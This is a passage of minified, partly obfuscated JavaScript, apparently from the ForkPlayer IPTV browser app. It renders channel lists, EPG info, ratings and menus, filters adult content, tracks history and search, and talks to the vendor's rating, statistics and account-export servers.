height='"+Math.ceil(llOII1OOGQQO00OYpr*0.7)+"' style='float: left; padding: 2px 4px 0px 0px;' src='"+_img(el.logo_30x30)+"' /> "+el.title+"</li>"}
li+="</ul>"}
var ci=gV(c.menu[i],"logo_30x30");if(ci=="hidden"||ci=="none"||ci==""||box_low2||lIl11llQV1Z1NOO0IYpr(12))var logo="";else logo="<img onerror=\"this.onerror=null;this.style.display='none';\" width='"+Math.ceil(llOII1OOGQQO00OYpr*0.85)+"' height='"+Math.ceil(llOII1OOGQQO00OYpr*0.7)+"' style='float: left; padding: 2px 4px 0px 0px;' src='"+_img(c.menu[i].logo_30x30)+"' /> ";hmenu+=gV(c.menu[i],"before")+"<div id='menu"+i+"'"+lIl11llQV1Z1NOO0IYpr(1,[" onmousemove=\"if(parent.handler=='menu'&&(parent.getSelect()!=-3||parent.menuSel!="+i+")) {console.log('s='+parent.getSelect());console.log('ms='+parent.menuSel);parent.menuSubSel=-2;parent.setSelect(-3);parent.menuSel="+i+";parent.linkOver();}\" onclick=\"if(parent.menuSubSel!=-2) parent.menu_hideSub();else{parent.menuSel="+i+";parent.menu_play();}\"",""])+" style='height:"+Math.ceil(llOII1OOGQQO00OYpr*0.80-1)+"px;border:2px solid transparent;margin:0px 5px;float:left;font-size:85%;background: inherit;'><div style='overflow:hidden;max-width:"+wi+"px;height:"+Math.ceil(llOII1OOGQQO00OYpr*0.80-1)+"px;'>"+logo+c.menu[i].title+"</div>"+li+"</div>";hmenu+=gV(c.menu[i],"after")}
hmenu+="</div>"}catch(e){console.log(e);kjtYpr.popUp("Error menu on this site<br>"+e.message,2000)}}
statusbar("Load elements: "+c.channels.length);var iframe=$_("site");iframe=iframe.contentWindow||(iframe.contentDocument.document||iframe.contentDocument);iframe.document.open();iframe.document.write("<!DOCTYPE html><html>"+"<style>"+c.lOOl1llI1qyVIOl10O1Ypr()+' '+gV(c.global,"css").replace(/(\\|')/g,"").replace(/"/g,'\"')+"</style>"+"<body id=\"sitebody\" style=\"border:none;margin:0px; padding:0px;zoom:"+kjtYpr.GL.zoom+"%;\">"+"<div id=\"scrollsite\" class=\"site\" style=\"height:"+((innerH*100/kjtYpr.GL.zoom)-siteTop).toFixed(0)+"px;\" onscroll=\"parent.scrollSite();\"></div>"+"<div id=\"bbot\" class=\"buttons\"></div>"+"</body>"+"<script>"+"document.addEventListener(\"keydown\",window.top.keyHandlerPress,false);"+"var $=parent.$;"+"</script>"+"</html>");iframe.document.close();c.setload=1;console.trace();onloadtimer=setInterval(function(){if($_("scrollsite")!=null&&c.setload&&insetActive==pq.lI1101I0v1OO1OIYpr.id){c.setload=0;buff.cleartop();clearInterval(onloadtimer);lI1I1IxFCIh1l01llYpr("scrollsite",hmenu+'<div id="rightHalf" class="rightHalf"> <div id="infoList"> </div></div> <div id="middle"></div> <div id="controlcontent" style="padding-bottom: 43px;float: left;width:100%;margin:0px;text-align:'+((gV(c.global,"align")=="")?"center":gV(c.global,"align"))+';"><div id="content"></div></div>');console.log("iframe site create "+$_("content"));if(c.lI1101I0v1OO1OIYpr.loadPage!=null){c.lI1101I0v1OO1OIYpr.INC=c.lI1101I0v1OO1OIYpr.loadPage.inc;c.lI1101I0v1OO1OIYpr.page=c.lI1101I0v1OO1OIYpr.loadPage;c.lI1101I0v1OO1OIYpr.isLoading=0;delete c.lI1101I0v1OO1OIYpr.loadPage}else c.lI1101I0v1OO1OIYpr.INC=c.inc;c.lI1101I0v1OO1OIYpr.lastResel="";c.renderChannels(getSelect());if(!pq.goBack)lI0lI1O1l1Pa100l0Ypr(c);console.log("set returnSelect "+gV(c.global,"returnSelect"));if(gV(c.global,"returnSelect")!==""){c.lI1101I0v1OO1OIYpr.focused(gV(c.global,"returnSelect"));c.global.returnSelect=""}else if(gV(c.global,"defaultSelect")!=="")c.lI1101I0v1OO1OIYpr.focused(gV(c.global,"defaultSelect"));else if(gV(pq.elCh,"defaultSelect")!=="")c.lI1101I0v1OO1OIYpr.focused(gV(pq.elCh,"defaultSelect"));else c.lI1101I0v1OO1OIYpr.focused(0);if(gV(c.global,"returnTop")>0){buff.scrollsitetop(c.global.returnTop);c.global.returnTop=""}
set_times();if(kjtYpr.GL.rate>0)c.get_rates();console.log("Time RENDER="+(new Date().getTime()-c.start11));if(c.IFRAMES.length==0)c.cancel()}},80)}
renderInset();if(c.lI1101I0v1OO1OIYpr.fwhistory.length==0)$_("imgkb3").src=_img("_ST_page_fwd_off.png");else $_("imgkb3").src=_img("_ST_page_fwd.png")},validate:function(s){if(s.indexOf("<style>")>=0){s=s.replace(/<style.*?>.*?<\/style>/g,'Deprecated $_PL["style"] Use new global tag $_PL["css"] Detail at http://bit.ly/3LLZXnD')}
return s},epgAppend:function(b1,b2){var c=this;var top_t=buff.scrollsitetop()-innerH;var top_b=top_t+(innerH*3);if(!ll0l0loMtIlIOYpr()&&c.is_iptv>2){var x1=getSelect()-20;var x2=getSelect()+20;if(b1!=null)x1=b1;if(b2!=null)x2=b2;if(x1<0)x1=0;if(x2>c.channels.length)x2=c.channels.length;console.log("epgAppend "+x1+"/"+x2);for(var i=x1;i<x2;i++){if(c.getTypePos(c.channels[i],i)=="list"&&$_("ch"+i)!=null){if(typeof c.channels[i].epgnow!="undefined"){var ch_pos=buff.chtop(i);if(ch_pos>top_t&&ch_pos<top_b){if(gV(c.channels[i],"display_title")!="")var title=c.channels[i].display_title;else title=c.channels[i].title;if(title==""||title==" ")title=gV(c.channels[i],"playlist_url").replace(/^https?:\/\//,"");lI1I1IxFCIh1l01llYpr("titleid"+i,"<div style='width: 40%;  float: left;  text-align: left;  height: "+css_wh(35)+"px;    overflow: hidden;  '>"+""+title+"</div>"+"<div style='float:right;width:59%;text-align:left;font-size:"+lOl10OxfIOI0llYpr+"px;'><div style='float:left;width:86%;height:"+css_wh(23)+"px; overflow: hidden;'>"+c.channels[i].epgnow.title+"</div><div style='float:right;width: 14%;font-size: 90%;'>"+c.channels[i].epgnow.time+"</div><br>"+"<div style='width:100%;height:"+css_wh(5)+"px;background-color:gray;'>"+"<div style='width:"+c.channels[i].epgnow.cur+"%;height:5px;background-color:rgb(132, 29, 29);'></div>"+"</div>"+"</div>")}else if(ch_pos>top_b)break}}}}},get_rates:function(){var c=this;if(typeof rates[c.lIQ0Il1IlIb1Il1OYpr]!="undefined"){c.set_rates(rates[c.lIQ0Il1IlIb1Il1OYpr]);return}
var s="";for(var i=0;i<c.channels.length;i++){if(gV(c.channels[i],"playlist_url").indexOf("http")==0){var k=md5(c.channels[i].playlist_url);if(s.indexOf(k)==-1){if(s!="")s+="-";s+=k}}}
if(s!=""){var r2=uHelper.create("directnoheader");r2.hidden=1;r2.parse=function(s){var m=l0QO11lOz0bfh10l0Ypr(s);if(m!=null){rates[c.lIQ0Il1IlIb1Il1OYpr]=m;c.set_rates(m)}};r2.getI("http://browser.appinfo.su/gstatic.php?do=get&u="+s)}},set_rates:function(m){var c=this;var x1=0,x2=9999;if(kjtYpr.GL.pr>0)var backgrOp="background:none #123313;";else backgrOp="";for(var i=0;i<c.channels.length;i++){if(gV(c.channels[i],"playlist_url").indexOf("http")==0&&$_("rat"+i)!=null){var x=md5(c.channels[i].playlist_url);if(typeof m[x]!="undefined"){c.channels[i].rates=m[x];if(m[x][0]>0||m[x][1]>0){$_("rat"+i).style.display="block";var proc=Math.ceil(100*(m[x][1]/(m[x][0]+m[x][1])));lI1I1IxFCIh1l01llYpr("rat"+i,"<span style='color:#54d659;padding:1px 2px;font-size:"+css_wh(12)+"px;"+backgrOp+"'>"+proc+"%</span><br><span style='color:#c7c1c1;padding:1px 2px;font-size:"+css_wh(10)+"px;"+backgrOp+"'>"+(m[x][0]+m[x][1])+"</span>")}}}}},renderIcons:function(n){var c=this;var top_t=(buff.scrollsitetop()*0.75).toFixed(0);var top_b=(buff.scrollsitetop()+($("#site").height()*2)*1.25).toFixed(0);var x1=n-50;var x2=n+50;if(x1<0)x1=0;if(x2>c.channels.length-1)x2=c.channels.length-1;console.log("render icons "+c.inc+" to "+x1+"/"+x2);for(var i=x1;i<=x2;i++){if($_("ch"+i)!=null){if($_("ch"+i).style.display=="none")$_("ch"+i).style.display="";if($_("img"+i)!=null){var ch_pos=buff.chtop(i);if(ch_pos>=top_t&&ch_pos<top_b){var ds=$_("img"+i).getAttribute('data-src');if(ds){$_("img"+i).setAttribute('src',ds);$_("img"+i).setAttribute('data-src',"")}}else if(ch_pos>top_b){console.log("break "+i);break}}}}},renderChannels:function(n,mode){var c=this,n2=0,x1;if(insetActive!=c.lI1101I0v1OO1OIYpr.id)return;var top_t=(buff.scrollsitetop()*0.75).toFixed(0);var top_b=(buff.scrollsitetop()+($("#site").height()*2)*1.25).toFixed(0);if(n==null){for(var i=0;i<c.channels.length;i++){if(buff.chtop(i)>=buff.scrollsitetop()){x1=i;break}}
if(x1==null){x1=0;var x2=c.channels.length}else{x1-=50;x2=x1+100}}else{x1=1*n-50;x2=1*n+50}
if(gV(mode)=="update"){if(typeof prev[c.SAVE_lIQ0Il1IlIb1Il1OYpr]!="undefined")prev[c.SAVE_lIQ0Il1IlIb1Il1OYpr].channels=l0QO11lOz0bfh10l0Ypr(llIl1I1HlMgNII1IO0Ypr(c.channels))}
if(c.count!=c.channels.length||gV(mode)=="update"||$_("content")==null||$_("content").innerHTML==''){var html="";c.upPos();for(var i=0;i<c.channels.length;i++){var Ch=c.channels[i];Ch.imgsrc=Ch.logo_30x30;var dop="";if(i<x1||i>x2){dop=' style="display:none;"'}
html+=c.renderCh(Ch,i,dop)}
lI1I1IxFCIh1l01llYpr("content",c.validate(gV(c.global,"before")+html+gV(c.global,"after")));c.count=c.channels.length;if(n!=null){c.lI1101I0v1OO1OIYpr.lastselect=n;c.lI1101I0v1OO1OIYpr.mark(n,1)}}
console.log("render page "+c.inc+" to "+x1+"/"+x2);for(var i=0;i<c.channels.length;i++){if(typeof c.channels[i]=="undefined"){console.log("renderChannels undefined "+i);console.log(c)}else if($_("ch"+i)!=null){if(i>=x1&&i<=x2){$_("ch"+i).style.display="";if($_("img"+i)!=null){var ds=$_("img"+i).getAttribute('data-src');if(ds){$_("img"+i).setAttribute('src',ds);$_("img"+i).setAttribute('data-src',"")}}
if(c.channels.length>3&&getSelect()>=0.7*i&&c.canceled&&typeof c.channels[i].onshow=="object"&&c.IFRAMES.length==0){console.log("ONSHOW step");c.iframeajax=1;c.canceled=0;c.channels[i].iframeid=i;c.channels[i].iframe="0";c.channels[i].iframetype="ajax";var t=c.channels[i].onshow;t.iframeid=i;t.iframe="0";t.iframetype="ajax";c.IFRAMES.push(t);delete c.channels[i].onshow;if($_("titleid"+i)!=null&&gV(t,"title")!="")lI1I1IxFCIh1l01llYpr("titleid"+i,gV(t,"title"));if($_("img"+i)!=null&&gV(t,"logo_30x30")!="")$_("img"+i).src=gV(t,"logo_30x30")}}}}
c.epgAppend(x1,x2);console.log("mode="+mode+" c.IFRAMES.length"+c.IFRAMES.length);if(c.iframeajax||(!c.canceled&&mode!="focused")){var olu="";if(!c.iframeajax)c.lI1101I0v1OO1OIYpr.focused();c.iframeajax=0;if(c.IFRAMES.length){for(var i in c.IFRAMES){if(typeof c.IFRAMES[i].src=="undefined"){if(olu.indexOf("--"+c.IFRAMES[i].playlist_url+"--")>=0)continue;console.log("OPEN IFR="+i+" /"+c.IFRAMES[i].playlist_url);c.IFRAMES[i].src=1;for(var j in c.channels){if(c.channels[j].iframeid==c.IFRAMES[i].iframeid){if($_("img"+j)!=null)$_("img"+j).src="http://"+lIOO01vuII1IQIYpr+"/ForkPlayer2.5/img/b/loading.gif";break}}
var tmp={}
lI1I1IxFCIh1l01llYpr("navinfo2",(++c.IFRAMES_INSERT)+"/"+c.IFRAMES.length);if(timestamp>0)c.lI1101I0v1OO1OIYpr.navigate(c.IFRAMES[i]);else setTimeout(function(){if(1)c.lI1101I0v1OO1OIYpr.navigate(c.IFRAMES[i])},1600);return}
olu+="--"+c.IFRAMES[i].playlist_url+"--"}
c.IFRAMES=[];for(var i in c.channels){c.channels[i].iframe="";c.channels[i].iframeid=""}
c.cancel()}}},getSubI:function(x,ch){var c=this;console.log(ch);if(x.length==1)return ch[x[0]].submenu;else{ch=ch[x.shift()].submenu;return c.getSubI(x,ch)}},toChannels:function(pq){var c=this;c.reallinks=0;if(c.canceled){console.log("canceled to");return}
c.lI1101I0v1OO1OIYpr=pq.lI1101I0v1OO1OIYpr;console.log(pq);if(!c.l1IOIl100j1fXIlIIYpr){if(c.handlerData(pq)){return}}
if(c.canceled){console.log("canceled o2");return}
if(pq.data.channels==null){console.log("404/")}
try{console.log('data["channels"][0]["title"]='+pq.data.channels[0].title);if(pq.data.channels[0].title.match(/(Нет данных|Здесь пусто)/)){console.log("send fail stat");c.ERR=0}}catch(e){if(c.l1IOIl100j1fXIlIIYpr){if(gV(pq.elCh,"iframetype")!="ajax")pq.data.channels=[{"title":"Ничего не найдено!"}]}}
console.log("toChannels "+c.lIQ0Il1IlIb1Il1OYpr);var dm=c.lIQ0Il1IlIb1Il1OYpr.match("^https?://(www\.|m\.)?(.*?)(:|\\?|/|#|$)");if(dm!=null)dm=dm[2];else dm="localhost";console.log(dm);c.XML_DOMAIN=dm;prev[c.SAVE_lIQ0Il1IlIb1Il1OYpr.split("#submenu")[0].split("#group=")[0]]=l0QO11lOz0bfh10l0Ypr(llIl1I1HlMgNII1IO0Ypr(pq.data));if(c.lIQ0Il1IlIb1Il1OYpr.indexOf("#submenu")>0){var x=c.lIQ0Il1IlIb1Il1OYpr.split("#submenu");x.shift();console.log(x);var ch=c.getSubI(x,pq.data.channels);console.log(ch);pq.data.channels=l0QO11lOz0bfh10l0Ypr(llIl1I1HlMgNII1IO0Ypr(ch));pq.data.title="";pq.data.navigate=""}
console.log(pq);var m=c.lIQ0Il1IlIb1Il1OYpr.match(/#.*?catchup=(.*?)(&|$|#)/);if(m!=null)c.global.catchup=m[1];var m=c.lIQ0Il1IlIb1Il1OYpr.match(/#.*?catchup-days=(.*?)(&|$|#)/);if(m!=null)c.global.catchup_days=m[1];var alltags=[];if(gV(pq.data,"is_iptv").toString().match(/true|1/i))this.is_iptv=10;else if(gV(pq.data,"is_iptv").toString().match(/false|0/i))this.is_iptv=-1;for(var i in pq.data){console.log(i);if(i.indexOf("all_")==0)alltags[i.substr(4)]=pq.data[i]}
if(typeof pq.data.style=="object"&&gV(pq.data,"css")==""){pq.data.before='<div style="font-size:80%;color:gray;">This site use deprecated $_PL["style"] Please use new global tag $_PL["css"] Detail at http://bit.ly/3LLZXnD</div>'+gV(pq.data,"before")}
if(gV(pq.data,"css").match(/important/)){pq.data.before='<div style="font-size:80%;color:gray;">This site use illegal !important tags in $_PL["css"] Please delete It`s.  Detail at http://bit.ly/3LLZXnD</div>'+gV(pq.data,"before");pq.data.css=pq.data.css.replace(/!.*?important/g,"important")}
for(var i in pq.data){var v=pq.data[i];if(i=="background_image"&&v!="")c.global["background-image"]=v;else if(i=="menu"){for(var j in v){if(gV(v[j],"playlist_url").indexOf("AddSearch(")==0&&l01llO0sYbDOI1OIYpr(gV(v[j],"playlist_url"))){}else if(gV(v[j],"playlist_url").indexOf("AddFavorite(")==0&&lOI11IaRlnp1OIOllYpr(gV(v[j],"playlist_url"))){}else c.menu.push(v[j])}}else if(i=="channels"){console.log(alltags);for(var j in v){var ttl=gV(v[j],"title");for(var k in alltags){console.log(k);if(gV(v[j],k)=="")v[j][k]=alltags[k];else{v[j][k]=v[j][k].replace("all_"+k,alltags[k])}}
if(gV(v[j],"iframe")!=""){v[j].iframelogo=gV(v[j],"logo_30x30");if(c.l1IOIl100j1fXIlIIYpr){v[j].iframeid=pq.elCh.iframeid+"-"+c.channels.length;c.lI1101I0v1OO1OIYpr.page.IFRAMES.push(v[j])}else{v[j].iframeid=c.channels.length;c.IFRAMES.push(v[j])}}
v[j].stream_url=gV(v[j],"stream_url");if(gV(v[j],"search_on")==""&&(gV(v[j],"playlist_url")+gV(v[j],"stream_url")).match(/^(http|udp)/))c.reallinks++;if(gV(v[j],"playlist_url").indexOf("payd_")==0){c.input[v[j].playlist_url.substr(5)]=gV(v[j],"value")}
if(v[j].stream_url!=""){if(v[j].stream_url.match(/\.(m3u|xml|txt)$/i)){v[j].playlist_url=v[j].stream_url;v[j].stream_url=""}else if(!ll0l0loMtIlIOYpr(c.lIQ0Il1IlIb1Il1OYpr)&&this.is_iptv>=0&&this.is_iptv<4){if(gV(v[j],"jtvname")!="")this.is_iptv++;if(ttl.length<27){if(typeof JtvC[ttl.toLowerCase()]!="undefined"||typeof JtvE[ttl.toLowerCase()]!="undefined"){console.log("is_iptv++ is_epg "+ttl);this.is_iptv++}else if(ttl.match(/^(discovery|россия|СТС|тнт|первый канал|brazzers tv|hustler |Amedia|Пиксель|Nickelodeon|ПлюсПлюс|Карусель|Малятко|Boomerang|Охота и рыбалка|Матч|CBS|Bridge|MTV |Music Box|CNN|LifeNews|Russia Today|TV |TV-)/i)){console.log("is_iptv++ "+ttl);this.is_iptv++}else if(ttl.match(/ tv( |$)/i)){console.log("is_iptv2++ "+ttl);this.is_iptv++}}}}
if(gV(v[j],"group")!==""){var k=v[j].group.split(";");for(var jk=0;jk<k.length;jk++){if(!in_array(k[jk],c.group))c.group.push(k[jk])}}
if(gV(v[j],"location")>0){console.log(v[j]);if(typeof pq.lI1101I0v1OO1OIYpr.page!="undefined"){if(typeof prev[pq.lI1101I0v1OO1OIYpr.page.SAVE_lIQ0Il1IlIb1Il1OYpr]!="undefined")prev[pq.lI1101I0v1OO1OIYpr.page.SAVE_lIQ0Il1IlIb1Il1OYpr].cacheinfo="nocache"}
if(v[j].location==2){}
return pq.lI1101I0v1OO1OIYpr.navigate(v[j])}
if(kjtYpr.GL.adult==0&&c.lIQ0Il1IlIb1Il1OYpr.match(/^(http|about:blank|submenu)/)&&(gV(v[j],"group").match(/взрослы/i)||is_xxx(gV(v[j],"group"))||is_xxx(gV(v[j],"infolink"))||is_xxx(gV(v[j],"title"))||is_xxx(gV(v[j],"playlist_url"))||is_xxx(gV(v[j],"stream_url")))){if(c.lIQ0Il1IlIb1Il1OYpr.match(/^about:blank/))continue;v[j].title="This content hidden in your settings!";v[j].description="This content hidden in your settings!";v[j].logo_30x30="https://raw.githubusercontent.com/komivp/appinfodl/main/static/sensitive.png";v[j].stream_url="";v[j].infolink="";v[j].playlist_url="cmd:info(Adult content hidden in your settings!);";console.log("is_adult hide "+ttl)}
if(gV(v[j],"playlist_url").indexOf("AddSearch(")==0&&l01llO0sYbDOI1OIYpr(gV(v[j],"playlist_url"))){}else if(gV(v[j],"playlist_url").indexOf("AddFavorite(")==0&&lOI11IaRlnp1OIOllYpr(gV(v[j],"playlist_url"))){}else c.channels.push(v[j])}}else if(i=="typeList"&&v!="")c.typeList=v;else c.global[i]=v}
if(gV(c.global,"next_page_url")!=""){console.log(c);console.log(pq);var x={"logo_30x30":_img("_ST_right.png"),"title":"Next page","playlist_url":gV(c.global,"next_page_url"),"onshow":{"logo_30x30":_img("_ST_loading.gif"),"title":"Load next page...","playlist_url":gV(c.global,"next_page_url"),"iframeid":c.channels.length,"iframe":0,"iframetype":"ajax"}};if(c.l1IOIl100j1fXIlIIYpr&&gV(pq.elCh,"iframetype")!="ajax")x.onshow=null;c.channels.push(x);c.global.next_page_url=""}
if(pq.tosource){c.lI1101I0v1OO1OIYpr.navigate("view-source:"+c.lIQ0Il1IlIb1Il1OYpr);pq.tosource=0;return}
if(c.l1IOIl100j1fXIlIIYpr&&c.channels.length>0){console.log("ISIFR id ("+c.inc+") page id "+c.lI1101I0v1OO1OIYpr.page.inc);console.log("ISIFR ADD TO ("+c.lI1101I0v1OO1OIYpr.page.channels.length+")");console.log(pq);var xp=pq.elCh.iframe.split(",");if(xp.length>1)c.IFRAMES_INSERT=parseInt(xp[1]);for(var i in c.lI1101I0v1OO1OIYpr.page.channels){if(c.lI1101I0v1OO1OIYpr.page.channels[i].iframeid==pq.elCh.iframeid){if(isNaN(c.IFRAMES_INSERT)||c.IFRAMES_INSERT<1)c.IFRAMES_INSERT=i;var x=c.lI1101I0v1OO1OIYpr.page.channels.splice(i,1);var jpush=0;for(var j=0;j<c.channels.length;j++){if(gV(c.global,"startcontent")>0){if(j<c.global.startcontent)continue}
if(gV(c.global,"endcontent")!=""&&gV(c.global,"endcontent")>=0){if(j>c.global.endcontent)continue}
console.log(c.channels[j]);if(gV(pq.elCh,"iframetype")=="ajax"){}else{if(c.channels[j].stream_url==""&&c.channels[j].playlist_url=="")continue;if(gV(pq.elCh,"excludetitlematch")!=""){if(c.channels[j].title.match(new RegExp(gV(pq.elCh,"excludetitlematch"),"ig")))continue}else if(c.channels[j].title.match(/(не найдено|здесь пусто|следующая стр|нет результатов)/i))continue;if(pq.elCh.logo_30x30.match(/^(http|_)/))c.channels[j].logo_30x30=pq.elCh.iframelogo;c.channels[j].position=gV(pq.elCh,"position");if(gV(pq.elCh,"position")==""&&c.lI1101I0v1OO1OIYpr.page.global.typeList!="start"){c.channels[j].before=c.channels[j].after=""}
if(gV(c.channels[j],"iframe")!="")c.channels[j].iframe=pq.elCh.iframe;console.log("curPage.IFRAMES_INSERT="+c.IFRAMES_INSERT)}
c.channels[j].sourceurl=c.lIQ0Il1IlIb1Il1OYpr;if(x!=null){if(gV(x,"br"))c.channels[j].br=gV(x,"br");x=null}
if(isNaN(xp[0])||xp[0]<1||xp[0]>jpush||gV(c.channels[j],"iframe")!=""){c.lI1101I0v1OO1OIYpr.page.channels.splice(c.IFRAMES_INSERT++,0,c.channels[j]);jpush++}else c.lI1101I0v1OO1OIYpr.page.channels.push(c.channels[j])}
break}}}
if(c.lIQ0Il1IlIb1Il1OYpr=="cmdEpg")c.is_iptv=3;if(c.is_iptv>2){if(gV(c.global,"url_tvg")!=""){loadxmltv(gV(c.global,"url_tvg"),c);etst=setTimeout(function(){lIl1111IIqlINOO10OYpr(c)},3000)}else lIl1111IIqlINOO10OYpr(c);if(kjtYpr.GL.sortiptv>0&&c.lIQ0Il1IlIb1Il1OYpr.indexOf("http")==0)c.channels.sort(function(a,b){var str1=a.title;var str2=b.title;if(kjtYpr.GL.sortiptv==2){if(str1.charCodeAt(0)<256&&str1.charCodeAt(0)>57)str1="яя"+str1;if(str2.charCodeAt(0)<256&&str2.charCodeAt(0)>57)str2="яя"+str2}
try{var rx=/([^\d]+|\d+)/ig;var str1split=str1.match(rx);var str2split=str2.match(rx);for(var i=0,l=Math.min(str1split.length,str2split.length);i<l;i++){var s1=str1split[i],s2=str2split[i];if(s1===s2)continue;if(isNaN(+s1)||isNaN(+s2)){return s1>s2?1:-1}else return+s1-s2}}catch(e){console.log(e);return 0}
return 0});if(kjtYpr.GL.sortiptv==3){for(var index=0;index<c.channels.length;index++){c.channels[index].origsel=index}
c.ordchannels=l0QO11lOz0bfh10l0Ypr(llIl1I1HlMgNII1IO0Ypr(c.channels));try{c.channels=reordered(c.channels)}catch(e){console.log(e);kjtYpr.inf("Error sorting channels: "+e.message,2000)}}}
if(c.l1IOIl100j1fXIlIIYpr){c.lI1101I0v1OO1OIYpr.page.renderChannels(getSelect(),"update");c.cancel()}else{if(gV(c.global,"icon")=="")c.global.icon=pq.elCh.logo_30x30;if(gV(c.global,"title")=="")c.global.title=pq.elCh.title;if(c.group.length>0){c.group.unshift("_FPALL_");c.origchannels=l0QO11lOz0bfh10l0Ypr(llIl1I1HlMgNII1IO0Ypr(c.channels));c.listGroup()}
if(!pq.goBack){console.log("SAVE TO HIST"+c.lIQ0Il1IlIb1Il1OYpr);if(pq.lI1101I0v1OO1OIYpr.get("url")==c.lIQ0Il1IlIb1Il1OYpr){console.log(pq.lI1101I0v1OO1OIYpr.history);pq.lI1101I0v1OO1OIYpr.put("img",c.global.icon);pq.lI1101I0v1OO1OIYpr.put("title",c.global.title)}else{if(pq.lI1101I0v1OO1OIYpr.get("url").indexOf("#group=")>0&&pq.lI1101I0v1OO1OIYpr.get("url").split("#group")[0]==c.SAVE_lIQ0Il1IlIb1Il1OYpr.split("#group")[0]){pq.lI1101I0v1OO1OIYpr.put("title",c.global.title);pq.lI1101I0v1OO1OIYpr.put("url",c.SAVE_lIQ0Il1IlIb1Il1OYpr)}else{pq.lI1101I0v1OO1OIYpr.put("s",pq.elCh.index);pq.lI1101I0v1OO1OIYpr.put("top",gV(pq,"top"));var x={"url":c.SAVE_lIQ0Il1IlIb1Il1OYpr,"img":c.global.icon,"title":c.global.title};if(gV(pq.elCh,"local")!=="")x.l=pq.elCh.local;if(gV(pq.origelCh,"parser")!=="")x.p=pq.origelCh.parser;if(gV(pq.origelCh,"parser2")!=="")x.p2=pq.origelCh.parser2;if(gV(pq.origelCh,"mb_parser")!=="")x.mp=pq.origelCh.mb_parser;pq.lI1101I0v1OO1OIYpr.history.push(x)}
pq.lI1101I0v1OO1OIYpr.save()}
if(typeof pq.elCh.search=="object"||(c.SEARCH_TEMPL.indexOf("%s")>0&&gV(pq.inputed,"text")!=""&&gV(pq.elCh,"title").match(/(поиск|search|искать|найти|пошук)/i)&&!is_local(c.lIQ0Il1IlIb1Il1OYpr))){console.log("SAVE TO Search "+c.SEARCH_TEMPL);if(c.IFRAMES.length)var p="iframe";else p="site";title=pq.elCh.title;img=pq.elCh.logo_30x30;var x=pq.lI1101I0v1OO1OIYpr.get(null,-2);if(x!=null)if(!ll0l0loMtIlIOYpr(x.url)){if(x.title.length<15)title=x.title+" "+title;img=gV(x,"img")}
if(typeof pq.elCh.search=="object"){if(gV(pq.elCh.search,"title")!="")title=gV(pq.elCh.search,"title");if(gV(pq.elCh.search,"icon")!="")img=gV(pq.elCh.search,"icon");if(gV(pq.elCh.search,"playlist_url")!="")c.SEARCH_TEMPL=gV(pq.elCh.search,"playlist_url")}
c.addToSearchHist(c.SEARCH_TEMPL,p,title,img,pq)}}
margin=0;c.renderPage(pq)}
c.sendStat(-1,pq)},openUrl:function(pq,xml_url){var c=this;if(xml_url.match(/^(\/|usb:\/\/)/)){pq.elCh.local="direct";c.xhr=uHelper.create("directnoheader")}else c.xhr=uHelper.create("direct|rf|xml");c.xhr.ua=navigator.userAgent;c.xhr.parse=function(s){console.log("res go");console.log(s);statusbar("off");clearTimeout(c.tTimer);if(c.canceled){console.log("canceled res o");return}
pq.source=s;c.oncomplete(pq)}
if(xml_url=="http://cloudflare.appinfo.su/browseraccount/?do=fexport#POSTs=userdata"){if(user!=null){var g="";for(var i in allfs){var s=kjtYpr.l1O0l1gmmv01O11Ypr(allfs[i]);g+=s+"[-..-]"}
xml_url=xml_url.replace("userdata",mB64.encrypt(g))+"&rev=4"}else{c.cancel();kjtYpr.inf("Need login!",1500)}}
var ref=gV(pq.lI1101I0v1OO1OIYpr.page,"lIQ0Il1IlIb1Il1OYpr");if(ref==xml_url||ref.indexOf("http")!=0)ref="";console.log("go "+xml_url);console.log("ref "+ref);statusbar(xml_url,"link");if(gV(pq.elCh,"timeout")>0)this.xhr.atime=pq.elCh.timeout*1000;if(xml_url.indexOf("=postmd5")>0){if(xml_url.indexOf("#POST")>0)xml_url+="&"+"postmd5="+encodeURIComponent(pq.elCh.postmd5);else xml_url+="#POSTpostmd5="+encodeURIComponent(pq.elCh.postmd5)}
c.URL_REQUEST=xml_url;if(xml_url.indexOf("#POST")>0){c.xhr.postdata=xml_url.split("#POST")[1];xml_url=xml_url.split("#POST")[0]}
if(!is_local(xml_url)&&kjtYpr.GL.headers>0&&ref!=""){if(platform=="sams"&&!box_low2)c.xhr.addheaders["Save-Data"]=ref;else c.xhr.addheaders.Accept=ref}
if(pq.elCh.local!="direct"&&!xml_url.match(/(pastebin\.com)/)){xml_url=addident(xml_url);if(pq.refresh&&xml_url.indexOf("&refresh=true")==-1){pq.refresh=!1;xml_url+="&refresh=true"}
xml_url=xml_url.replace(/#submenu\d+$/,"")}
console.log("openUrl "+xml_url+" isifr "+c.l1IOIl100j1fXIlIIYpr+" c.parentURL "+c.parentURL+" p: "+c.xhr.postdata);c.xhr.get(xml_url);if((c.parentURL.indexOf("searchEngines|")==0||(xml_url.match(/(obovse\.ru|lnka\.ru|fxmlparsers\.ru)\//)&&xml_url.indexOf("search")==-1))&&timestamp<=0){if(is_xxx()||is_xxx(xml_url)){}else if(user==null)var mes="<span style='float: left;margin: 4px;background-color: #b5bdc3; font-size: 23px;text-align: left;border-radius: 5px;    padding: 0px 7px 5px 7px;'>x</span>Войдите в свой Профиль, это поможет не потерять ваши данные!<br>_FPDonate to browser development in Profile_!";else if(timestamp>-4&&mmes<15000){mes="От: cloudflare.appinfo.su<br><span style='text-align: left;color:orange'>_FPDonate to browser development in Profile_!</span>";mmes++}else mes="";if(mes!=""){console.log("settimer hint");c.tTimer=setTimeout(function(){hint(mes,"kb6")},200)}}},sendStat:function(m,pq){var c=this;if(box_low2)return;if(m==-1){if(seSt.length){console.log(seSt);clearTimeout(stSend);stSend=setTimeout(function(){uHelper.create("directnoheader").hid().getI("http://browser.appinfo.su/gstatic.php?id=spiderSearches&ver=12&#POSTs="+encodeURIComponent(llIl1I1HlMgNII1IO0Ypr(seSt)));seSt=[]},25000)}
